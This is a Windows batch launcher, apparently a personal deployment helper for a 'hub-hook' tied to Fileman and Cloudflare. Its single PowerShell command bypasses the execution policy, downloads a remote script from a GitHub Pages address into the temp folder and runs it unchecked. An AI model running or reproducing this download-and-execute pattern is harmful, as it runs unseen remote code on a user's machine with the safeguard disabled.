@echo off
REM Double-click. Always wget the latest hub-hook (Fileman then Cloudflare).
REM Does not send mail. Does not touch PayPal.
powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://agency002com-ship-it.github.io/ftp-drop/hub-hook.ps1' -OutFile ($env:TEMP + '\shift002-hub-hook.ps1') -UseBasicParsing; & ($env:TEMP + '\shift002-hub-hook.ps1')"
exit /b %ERRORLEVEL%
